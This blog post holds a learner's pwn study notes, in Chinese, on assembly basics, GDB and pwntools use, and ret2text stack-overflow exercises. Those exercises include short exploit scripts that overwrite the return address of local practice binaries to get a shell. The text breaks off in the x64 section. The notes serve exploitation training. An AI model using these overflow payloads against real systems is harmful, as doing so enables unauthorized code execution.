<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="GDB 动调基础 RIP: 存放当前执行的指令地址 RSP : 栈顶指针 RBP: 栈底指针 RAX: 通用寄存器 zf: Zero Flag 寄存器INTEL 指令集  1set disassembly-flavor intel   Assembly 一般指令1234567891011sub rsp, 0x18  ;rsp &#x3D; [rsp-0x18]mov rax, rbp   ;rax &#x3D; rb">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn_study_note">
<meta property="og:url" content="http://example.com/2025/03/25/pwn-study-note/index.html">
<meta property="og:site_name" content="xekOner: RusHhHhHhHhHhH">
<meta property="og:description" content="GDB 动调基础 RIP: 存放当前执行的指令地址 RSP : 栈顶指针 RBP: 栈底指针 RAX: 通用寄存器 zf: Zero Flag 寄存器INTEL 指令集  1set disassembly-flavor intel   Assembly 一般指令1234567891011sub rsp, 0x18  ;rsp &#x3D; [rsp-0x18]mov rax, rbp   ;rax &#x3D; rb">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2025-03-25T15:58:09.000Z">
<meta property="article:modified_time" content="2025-04-03T06:54:41.880Z">
<meta property="article:author" content="xekOnerR">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>pwn_study_note</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/topics">Topics</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/03/27/XCTF-Reverse-elrond32/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/03/25/Test/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/03/25/pwn-study-note/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/03/25/pwn-study-note/&text=pwn_study_note"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/03/25/pwn-study-note/&title=pwn_study_note"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/03/25/pwn-study-note/&is_video=false&description=pwn_study_note"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=pwn_study_note&body=Check out this article: http://example.com/2025/03/25/pwn-study-note/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/03/25/pwn-study-note/&title=pwn_study_note"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/03/25/pwn-study-note/&title=pwn_study_note"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/03/25/pwn-study-note/&title=pwn_study_note"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/03/25/pwn-study-note/&title=pwn_study_note"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/03/25/pwn-study-note/&name=pwn_study_note&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/03/25/pwn-study-note/&t=pwn_study_note"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#GDB-%E5%8A%A8%E8%B0%83%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">GDB 动调基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Assembly-%E4%B8%80%E8%88%AC%E6%8C%87%E4%BB%A4"><span class="toc-number">2.</span> <span class="toc-text">Assembly 一般指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gdb-%E4%B8%80%E8%88%AC%E6%93%8D%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">gdb 一般操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pwntools%E5%BA%93-%E4%B8%80%E8%88%AC%E6%93%8D%E4%BD%9C"><span class="toc-number">4.</span> <span class="toc-text">pwntools库 一般操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ret2X-%E4%BE%8B%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">ret2X 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC-ret2text-x86"><span class="toc-number">5.0.1.</span> <span class="toc-text">基本 ret2text x86</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#esp%E5%AF%BB%E5%9D%80%E7%9A%84-ret2text-x86"><span class="toc-number">5.0.2.</span> <span class="toc-text">esp寻址的 ret2text x86</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9F%BA%E6%9C%ACret2text-x64%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.0.3.</span> <span class="toc-text">基本ret2text x64程序</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2text-%E4%BC%A0%E5%8F%82-x86"><span class="toc-number">5.0.4.</span> <span class="toc-text">ret2text 传参 x86</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2text-%E4%BC%A0%E5%8F%82-x64"><span class="toc-number">5.0.5.</span> <span class="toc-text">ret2text 传参 x64</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2libc-x64"><span class="toc-number">5.0.6.</span> <span class="toc-text">ret2libc x64</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2libc-x86"><span class="toc-number">5.0.7.</span> <span class="toc-text">ret2libc x86</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2csu-x64"><span class="toc-number">5.0.8.</span> <span class="toc-text">ret2csu x64</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2syscall-0x32-0x64"><span class="toc-number">5.0.9.</span> <span class="toc-text">ret2syscall 0x32 &#x2F; 0x64</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#ret2shellcode"><span class="toc-number">5.0.10.</span> <span class="toc-text">ret2shellcode</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        pwn_study_note
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">xekOnerR</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-03-25T15:58:09.000Z" class="dt-published" itemprop="datePublished">2025-03-25</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h4 id="GDB-动调基础"><a href="#GDB-动调基础" class="headerlink" title="GDB 动调基础"></a>GDB 动调基础</h4><ul>
<li><code>RIP</code>: 存放当前执行的指令地址</li>
<li><code>RSP</code> : 栈顶指针</li>
<li><code>RBP</code>: 栈底指针</li>
<li><code>RAX</code>: 通用寄存器</li>
<li><code>zf</code>: Zero Flag 寄存器<br>INTEL 指令集</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set disassembly-flavor intel</span><br></pre></td></tr></table></figure>


<h4 id="Assembly-一般指令"><a href="#Assembly-一般指令" class="headerlink" title="Assembly 一般指令"></a>Assembly 一般指令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sub rsp, 0x18  ;rsp = [rsp-0x18]</span><br><span class="line">mov rax, rbp   ;rax = rbp</span><br><span class="line">lea rax, [rbp-0x18]   ;与上面的操作相同, lea可以当作运算指令, 运算结束后赋值给rax  (优点：指令断，不用重新赋值rbp)</span><br><span class="line">xor ebx, ebx   ;ebx = 0 / mov ebx, 0</span><br><span class="line">call xxxx    ;调用一个子程序</span><br><span class="line"></span><br><span class="line">cmp al, 0x61   ;一般下面会跟je/jne，cmp就相当于sub指令，al-0x61，但是结果不保存，与下面的jne/je进行比较</span><br><span class="line">	(ax,bx = 3, cmp ax,bx) 3-3=0 ，zf寄存器为1；相反的如果cmp两个数相减不等于0，那zf就等于0</span><br><span class="line">jne xxxxx   ;zf标志位不为0则跳转</span><br><span class="line">jn xxxx   ;zf标志位为0时跳转</span><br><span class="line">test eax, eax    ;当作cmp eax,0使用    eax&amp;eax, 相与, 相等相当于and eax,eax 但是不存储</span><br></pre></td></tr></table></figure>

<h4 id="gdb-一般操作"><a href="#gdb-一般操作" class="headerlink" title="gdb 一般操作"></a>gdb 一般操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">run  直接运行程序 / start  开始调试程序 gdb会自动断到分析处的main函数处 (rip指向main)</span><br><span class="line">disassembly $rip  在rip处反汇编</span><br><span class="line">b  设置断点 , b *0x00005555555527a</span><br><span class="line">	d num  删除断点</span><br><span class="line">	disable b num  使断点失效</span><br><span class="line">	enable b num  重新启用断点</span><br><span class="line">i b  查看设置的断点</span><br><span class="line">i r  查看所有寄存器</span><br><span class="line">c  continue 执行到断点</span><br><span class="line">ni   单步执行(步过)</span><br><span class="line">si   单步步入</span><br><span class="line">finish   步出</span><br><span class="line">p $rbp    print</span><br><span class="line">x/10i $rip   以汇编的方式查看$rip内存地址开始的下10行</span><br><span class="line">	x/20b $rbp-0x10     ;b=byte</span><br><span class="line">	x/20gx $rbp</span><br><span class="line">set *0x7fffffffd7c0=0x61    设置内存数据</span><br><span class="line">	set *((unsigned int)$ebp)=0x61</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="pwntools库-一般操作"><a href="#pwntools库-一般操作" class="headerlink" title="pwntools库 一般操作"></a>pwntools库 一般操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本地建立socat</span><br><span class="line">socat TCP-LISTEN:8877,fork exec:./question_1_plus_x64,reuseaddr</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    s.connect((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8877</span>))</span><br><span class="line">    payload = <span class="string">b&#x27;P&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x10&#x27;</span> <span class="comment"># ATTENTION BYTE</span></span><br><span class="line">    s.sendall(payload + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    conn = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8877</span>)</span><br><span class="line">    conn.sock = s</span><br><span class="line">    conn.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="ret2X-例题"><a href="#ret2X-例题" class="headerlink" title="ret2X 例题"></a>ret2X 例题</h4><h6 id="基本-ret2text-x86"><a href="#基本-ret2text-x86" class="headerlink" title="基本 ret2text x86"></a>基本 ret2text x86</h6><p>ret2text就是执行程序中已有的代码，例如程序中写有system等系统的调用函数, <strong>通过溢出覆盖返回地址执行</strong><br>IDA打开文件 ，找到函数内栈空间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-00000010 buf             dd ?</span><br><span class="line">-0000000C var_C           dd ?</span><br><span class="line">-00000008                 db ? ; undefined</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br></pre></td></tr></table></figure>
<p>判断buf 到 r(栈底指针) 处偏移为0x14 &#x3D; 20byte，r往下四字节就是给ret的栈空间，可以利用溢出来赋值r<br><strong>覆盖 <code>r</code> 本身需要额外的 4 字节</strong><br>20byte + 4byte &#x3D; 24byte</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27; * 20 + b&#x27;&amp;func&#x27;</span><br></pre></td></tr></table></figure>

<p>pwntools 脚本:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"><span class="comment"># checksec FILENAME</span></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_1_x86&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span></span><br><span class="line"><span class="comment"># padding = padding2ebp + context.word_size//8   </span></span><br><span class="line"><span class="comment">#通过调试得到</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># ni finish finish 到调用的函数内, ni....ni</span></span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x08049182</span></span><br><span class="line"><span class="comment"># sh_addr = 0x0804c03e </span></span><br><span class="line">payload = flat([cyclic(padding), return_addr])</span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>先ni，然后在pwntool shell中回车代表开始</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────</span><br><span class="line"> ► 0 0xe9b2c579 __kernel_vsyscall+9</span><br><span class="line">   1 0xe99ed9d7 read+55</span><br><span class="line">   2 0x80491f6 dofunc+69   &lt;- 这是我们要到达的地方</span><br><span class="line">   3 0x8049182 func</span><br><span class="line">   4      0xa None</span><br></pre></td></tr></table></figure>
<ul>
<li>gdb中finish（可以看右下角的 BACKTRACE）到main中的被调用的那个函数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────</span><br><span class="line"> ► 0 0x80491f6 dofunc+69</span><br><span class="line">   1 0x8049182 func</span><br><span class="line">   2      0xa None</span><br></pre></td></tr></table></figure>
<ul>
<li>然后可以用 <code>stack 20</code> 查看栈覆盖和溢出情况</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">06:0018│ ecx 0xfff272c8 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">07:001c│-00c 0xfff272cc ◂— 0x61616162 (&#x27;baaa&#x27;)</span><br><span class="line">08:0020│-008 0xfff272d0 ◂— 0x61616163 (&#x27;caaa&#x27;)</span><br><span class="line">09:0024│-004 0xfff272d4 ◂— 0x61616164 (&#x27;daaa&#x27;)</span><br><span class="line">0a:0028│ ebp 0xfff272d8 ◂— 0x61616165 (&#x27;eaaa&#x27;)</span><br><span class="line">0b:002c│+004 0xfff272dc —▸ 0x8049182 (func) ◂— push ebp</span><br></pre></td></tr></table></figure>
<ul>
<li>一直ni &#x2F; c就可以拿到shell</li>
</ul>
<h6 id="esp寻址的-ret2text-x86"><a href="#esp寻址的-ret2text-x86" class="headerlink" title="esp寻址的 ret2text x86"></a>esp寻址的 ret2text x86</h6><p>和基本题型差不多，只是ret位置在IDA中显示错误而已<br>在输入函数前提前准备好cyclic</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 50</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</span><br></pre></td></tr></table></figure>
<ul>
<li>stack 30<br>可以看到</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp 0xffffd160 ◂— 0</span><br><span class="line">01:0004│-034 0xffffd164 —▸ 0xffffd178 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">02:0008│-030 0xffffd168 ◂— 0x100</span><br><span class="line">03:000c│-02c 0xffffd16c —▸ 0x80491b7 (dofunc+9) ◂— add ebx, 0x2e49</span><br><span class="line">04:0010│-028 0xffffd170 ◂— 0xffffffff</span><br><span class="line">05:0014│-024 0xffffd174 —▸ 0xf7d8396c ◂— 0x914</span><br><span class="line">06:0018│ ecx 0xffffd178 ◂— 0x61616161 (&#x27;aaaa&#x27;)</span><br><span class="line">07:001c│-01c 0xffffd17c ◂— 0x61616162 (&#x27;baaa&#x27;)</span><br><span class="line">08:0020│-018 0xffffd180 ◂— 0x61616163 (&#x27;caaa&#x27;)</span><br><span class="line">09:0024│-014 0xffffd184 ◂— 0x61616164 (&#x27;daaa&#x27;)</span><br><span class="line">0a:0028│-010 0xffffd188 ◂— 0x61616165 (&#x27;eaaa&#x27;)</span><br><span class="line">0b:002c│-00c 0xffffd18c ◂— 0x61616166 (&#x27;faaa&#x27;)</span><br><span class="line">0c:0030│-008 0xffffd190 ◂— 0x61616167 (&#x27;gaaa&#x27;)</span><br><span class="line">0d:0034│-004 0xffffd194 ◂— 0x61616168 (&#x27;haaa&#x27;)</span><br><span class="line">0e:0038│ ebp 0xffffd198 ◂— 0x61616169 (&#x27;iaaa&#x27;)</span><br><span class="line">0f:003c│+004 0xffffd19c ◂— 0x6161616a (&#x27;jaaa&#x27;)</span><br><span class="line">10:0040│+008 0xffffd1a0 ◂— 0x6161616b (&#x27;kaaa&#x27;)</span><br><span class="line">11:0044│+00c 0xffffd1a4 ◂— 0x6161616c (&#x27;laaa&#x27;)</span><br></pre></td></tr></table></figure>

<p>可以看到ebp处为32byte，（其实是错误的，因为是esp寻址）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l iaaa</span><br><span class="line">Finding cyclic pattern of 4 bytes: b&#x27;iaaa&#x27; (hex: 0x69616161)</span><br><span class="line">Found at offset 32</span><br></pre></td></tr></table></figure>

<p>继续运行到ret：<br>可以看到esp处为 ‘faaa’, 断定栈空间到ret处为20byte, 后可溢出<br><code>20byte + 4byte</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffd18c ◂— 0x61616166 (&#x27;faaa&#x27;)</span><br><span class="line">01:0004│-008 0xffffd190 ◂— 0x61616167 (&#x27;gaaa&#x27;)</span><br><span class="line">02:0008│-004 0xffffd194 ◂— 0x61616168 (&#x27;haaa&#x27;)</span><br><span class="line">03:000c│ ebp 0xffffd198 ◂— 0x61616169 (&#x27;iaaa&#x27;)</span><br><span class="line">04:0010│+004 0xffffd19c ◂— 0x6161616a (&#x27;jaaa&#x27;)</span><br><span class="line">05:0014│+008 0xffffd1a0 ◂— 0x6161616b (&#x27;kaaa&#x27;)</span><br><span class="line">06:0018│+00c 0xffffd1a4 ◂— 0x6161616c (&#x27;laaa&#x27;)</span><br><span class="line">07:001c│+010 0xffffd1a8 ◂— 0xff0a616d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; cyclic -l faaa</span><br><span class="line">Finding cyclic pattern of 4 bytes: b&#x27;faaa&#x27; (hex: 0x66616161)</span><br><span class="line">Found at offset 20</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">pwnfile= <span class="string">&#x27;./question_4_1_x86_sep&#x27;</span></span><br><span class="line">io = process(pwnfile)</span><br><span class="line"><span class="comment">#io = remote(&#x27;&#x27;, )</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x14</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">return_addr = <span class="number">0x08049182</span></span><br><span class="line">payload = flat([cyclic(padding), return_addr])</span><br><span class="line">delimiter = <span class="string">&#x27;input:&#x27;</span></span><br><span class="line">io.sendlineafter(delimiter, payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h6 id="基本ret2text-x64程序"><a href="#基本ret2text-x64程序" class="headerlink" title="基本ret2text x64程序"></a>基本ret2text x64程序</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec question_4_1_x64</span><br><span class="line">[*] &#x27;/mnt/hgfs/CTF/Pwn_Study/pwn_exercise/section_2/第二章课件/chapter_2/test_6/question_4_1_x64&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>还是一样找溢出的地方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ rsp 0x7fffffffdfd0 ◂— 0</span><br><span class="line">01:0008│ rsi 0x7fffffffdfd8 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">02:0010│ rbp 0x7fffffffdfe0 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line">03:0018│+008 0x7fffffffdfe8 ◂— 0x6262626262626262 (&#x27;bbbbbbbb&#x27;)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
